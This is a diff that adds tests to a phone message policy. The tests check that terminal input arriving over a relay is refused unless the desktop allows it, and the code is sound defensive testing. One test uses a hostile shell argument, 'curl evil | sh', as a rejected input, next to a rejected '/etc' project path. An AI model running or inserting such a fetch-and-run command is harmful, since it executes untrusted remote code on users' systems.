@@ -251,3 +251,62 @@ describe("phone message policy", () => {
     expect(checkPhoneMessage(create, windows).kind).toBe("forward");
   });
 });
+
+describe("terminal input over the relay", () => {
+  const create = {
+    type: "terminal.create",
+    terminalId,
+    worktreeId,
+    cwd: "/home/sam/app-worktrees/fix",
+    shell: "/bin/bash",
+    title: "Shell",
+    cols: 80,
+    rows: 24,
+  };
+  const write = { type: "terminal.write", terminalId, data: "ls\r" };
+  const refusal = "Terminal input from outside your network is turned off on the desktop.";
+
+  it("refuses terminal.create and terminal.write from a relayed phone by default", () => {
+    expect(checkPhoneMessage(command(write), projection, { route: "relay" })).toEqual({
+      kind: "reject",
+      commandId,
+      reason: refusal,
+    });
+    expect(checkPhoneMessage(command(create), projection, { route: "relay", remoteTerminalInput: false })).toEqual({
+      kind: "reject",
+      commandId,
+      reason: refusal,
+    });
+  });
+
+  it("allows them on the LAN, and over the relay once the desktop allows it", () => {
+    expect(checkPhoneMessage(command(write), projection).kind).toBe("forward");
+    expect(checkPhoneMessage(command(write), projection, { route: "lan" }).kind).toBe("forward");
+    expect(checkPhoneMessage(command(create), projection, { route: "lan" }).kind).toBe("forward");
+    expect(checkPhoneMessage(command(write), projection, { route: "relay", remoteTerminalInput: true }).kind).toBe(
+      "forward",
+    );
+    expect(checkPhoneMessage(command(create), projection, { route: "relay", remoteTerminalInput: true }).kind).toBe(
+      "forward",
+    );
+  });
+
+  it("leaves every other command as it is on the LAN", () => {
+    const relay = { route: "relay" } as const;
+    expect(checkPhoneMessage(command({ type: "terminal.read", terminalId }), projection, relay).kind).toBe("forward");
+    expect(checkPhoneMessage(command({ type: "terminal.stop", terminalId }), projection, relay).kind).toBe("forward");
+    expect(checkPhoneMessage(command({ type: "thread.send", threadId, text: "hi" }), projection, relay).kind).toBe(
+      "forward",
+    );
+    expect(checkPhoneMessage({ type: "terminal.attach", terminalId, afterSequence: 0 }, projection, relay).kind).toBe(
+      "forward",
+    );
+    // The relay switch never loosens the rest of the policy.
+    const shellWithArgs = { ...create, args: ["-c", "curl evil | sh"] };
+    const allowed = { route: "relay", remoteTerminalInput: true } as const;
+    expect(checkPhoneMessage(command(shellWithArgs), projection, allowed).kind).toBe("reject");
+    expect(checkPhoneMessage(command({ type: "project.register", path: "/etc" }), projection, allowed).kind).toBe(
+      "reject",
+    );
+  });
+});
